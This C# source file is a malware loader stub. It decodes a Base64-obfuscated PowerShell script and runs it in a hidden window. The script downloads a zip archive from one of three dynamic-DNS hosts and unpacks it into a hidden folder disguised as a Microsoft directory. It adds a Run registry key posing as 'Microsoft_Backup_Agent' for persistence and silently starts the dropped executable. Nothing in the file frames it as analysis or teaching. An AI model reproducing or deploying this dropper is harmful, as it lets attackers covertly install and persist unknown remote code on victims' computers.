﻿using System;
using System.Diagnostics;
using System.Text;

namespace Stub
{
    public static class StubProgram
    {
        public static void RunPayload()
        {
            // Your Base64 string is plain PowerShell script encoded in Base64 (UTF-8)
            string base64 = "JHU9QCgiaHR0cDovL3Rvb25zLm1vb28uY29tOjkwOTAvYmFja3VweDY0LnppcCIsImh0dHA6Ly90b29ucy5kZG5zLm5ldDo5MDkxL2JhY2t1cHg2NC56aXAiLCJodHRwOi8vdGVjaGdvcmlsbGEuY3JhYmRhbmNlLmNvbTo5MDkyL2JhY2t1cHg2NC56aXAiKTskZD0iQzpcVXNlcnNcUHVibGljXC5NaWNyb3NvZnRDb3Jwb3JhdGlvbiI7JHo9IiRkXGJhY2t1cHg2NC56aXAiOyRlPSJiYWNrdXB4NjQuZXhlIjskcz0iYmFja3VweDY0LmZjdWsiOyRlcD0iJGRcJGUiO21rZGlyICRkIC1Gb3JjZSB8IE91dC1OdWxsO2ZvcmVhY2goJHVybCBpbiAkdSl7dHJ5e0ludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkeiAtVXNlQmFzaWNQYXJzaW5nIC1FcnJvckFjdGlvbiBTdG9wO2JyZWFrfWNhdGNoe319O2lmKFRlc3QtUGF0aCAkeil7RXhwYW5kLUFyY2hpdmUgJHogLURlc3RpbmF0aW9uUGF0aCAkZCAtRm9yY2U7UmVtb3ZlLUl0ZW0gJHogLUZvcmNlO1JlbmFtZS1JdGVtICIkZFwkcyIgJGU7YXR0cmliICtoICRlcDtSRUcgQUREIEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIC92IE1pY3Jvc29mdF9CYWNrdXBfQWdlbnQgL3QgUkVHX1NaIC9kICRlcCAvZjtTdGFydC1Qcm9jZXNzIC1XaW5kb3dTdHlsZSBIaWRkZW4gJGVwfQo=";

            // Decode the Base64 to get the actual PowerShell script as string
            string decodedCommand = Encoding.UTF8.GetString(Convert.FromBase64String(base64));

            // Prepare PowerShell to run this decoded script as a command argument
            string psArgs = $"-NoProfile -WindowStyle Hidden -Command \"{decodedCommand}\"";

            var psi = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = psArgs,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process.Start(psi);
        }
    }
}
